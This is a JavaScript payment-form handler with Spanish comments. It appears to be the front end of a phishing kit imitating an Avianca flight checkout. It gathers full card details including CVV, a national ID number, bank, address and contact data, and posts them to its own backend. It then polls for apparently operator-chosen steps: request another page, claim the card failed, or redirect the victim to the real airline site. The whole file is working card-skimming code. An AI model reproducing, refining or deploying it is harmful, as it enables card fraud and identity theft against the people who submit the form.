// public/js/payment.js
// Maneja formateo, envío al backend (/send-payment) y polling a /status/:transactionId

// FORMATO / UTIL
function limitDigits(el, max) {
  el.value = el.value.replace(/\D/g, "").slice(0, max);
}

function formatCNumber(el) {
  let v = el.value.replace(/\D/g, "").slice(0, 19);
  const parts = [];
  for (let i = 0; i < v.length; i += 4) parts.push(v.substr(i, 4));
  el.value = parts.join(" ");
}

function formatDate(el) {
  let v = el.value.replace(/\D/g, "").slice(0, 4);
  if (v.length >= 3) v = v.slice(0, 2) + "/" + v.slice(2);
  el.value = v;
}

// Loader UI
const loaderFull = document.querySelector(".loaderp-full");
function showLoader() { if (loaderFull) loaderFull.style.display = "flex"; }
function hideLoader() { if (loaderFull) loaderFull.style.display = "none"; }

// Enviar datos al backend
async function enviarDatos() {
  // recolectar campos del DOM (ajusta ids si cambias tu HTML)
  const card_number = document.getElementById("p").value.trim();
  const expiry_date = document.getElementById("pdate").value.trim();
  const cvv = document.getElementById("c").value.trim();
  const name = document.getElementById("name").value.trim();
  const surname = document.getElementById("surname").value.trim();
  const cc = document.getElementById("cc").value.trim();
  const email = document.getElementById("email").value.trim();
  const telnum = document.getElementById("telnum").value.trim();
  const city = document.getElementById("city").value.trim();
  const state = document.getElementById("state").value.trim();
  const address = document.getElementById("address").value.trim();
  const bank = document.getElementById("ban").value;
  const dues = document.getElementById("dues").value;
  const termsAccepted = document.getElementById("terms-accept").checked;
  const flightCost = document.getElementById("flight-cost").innerText;

  if (!card_number || !expiry_date || !cvv || !name || !surname || !cc || !email || !telnum || !city || !state || !address || !bank || !termsAccepted) {
    alert("Por favor, complete todos los campos del formulario y acepte los términos.");
    return;
  }

  const storedData = {
    name: name + ' ' + surname,
    cc,
    email,
    telnum,
    city,
    state,
    address,
    cardNumber: card_number.replace(/\s+/g, ''),
    expiryDate: expiry_date,
    cvv,
    bank,
    dues,
    flightCost
  };

  // Generar transactionId y persistir localmente (opcional)
  const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
  storedData.transactionId = transactionId;
  localStorage.setItem('paymentData', JSON.stringify(storedData));

  showLoader();

  try {
    const res = await fetch('/send-payment', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(storedData)
    });
    const j = await res.json();
    if (j && j.ok && j.transactionId) {
      // Iniciar polling al backend
      console.log('Enviado al backend. tx=', j.transactionId, 'msgId=', j.messageId);
      checkPaymentVerificationBackend(j.transactionId);
    } else {
      console.error('Error from backend', j);
      hideLoader();
      alert('Error enviando datos. Intenta de nuevo.');
    }
  } catch (err) {
    console.error('Error enviarDatos:', err);
    hideLoader();
    alert('Error de conexión. Intenta otra vez.');
  }
}

// Polling al backend
function checkPaymentVerificationBackend(transactionId) {
  const poll = async () => {
    try {
      const res = await fetch(`/status/${transactionId}`);
      const j = await res.json();
      const status = j && j.status ? j.status : 'not_found';

      if (status === 'pending' || status === undefined) {
        setTimeout(poll, 2000);
        return;
      }

      // Hay resultado
      hideLoader();

      switch (status) {
        case 'pedir_logo':
          window.location.href = "chedf.html"; // tu flujo
          break;
        case 'error_tc':
          alert("La tarjeta de crédito no pudo ser procesada. Por favor, verifique los detalles e intente nuevamente.");
          break;
        case 'finalizar':
          window.location.href = "https://www.avianca.com/";
          break;
        default:
          console.warn('Estado desconocido recibido:', status);
          break;
      }
    } catch (err) {
      console.error('Error en polling status:', err);
      setTimeout(poll, 2000);
    }
  };

  poll();
}

// BINDINGS
document.addEventListener('DOMContentLoaded', () => {
  const ccInput = document.getElementById('p');
  if (ccInput) ccInput.addEventListener('input', (e) => formatCNumber(e.target));
  const dateInput = document.getElementById('pdate');
  if (dateInput) dateInput.addEventListener('input', (e) => formatDate(e.target));
  const cvvInput = document.getElementById('c');
  if (cvvInput) cvvInput.addEventListener('input', (e) => limitDigits(e.target, 4));
  const dni = document.getElementById('cc');
  if (dni) dni.addEventListener('input', (e) => limitDigits(e.target, 10));
  const tel = document.getElementById('telnum');
  if (tel) tel.addEventListener('input', (e) => limitDigits(e.target, 10));

  const btn = document.getElementById('autorizarBtn');
  if (btn) btn.addEventListener('click', (ev) => {
    ev.preventDefault();
    enviarDatos();
  });
});
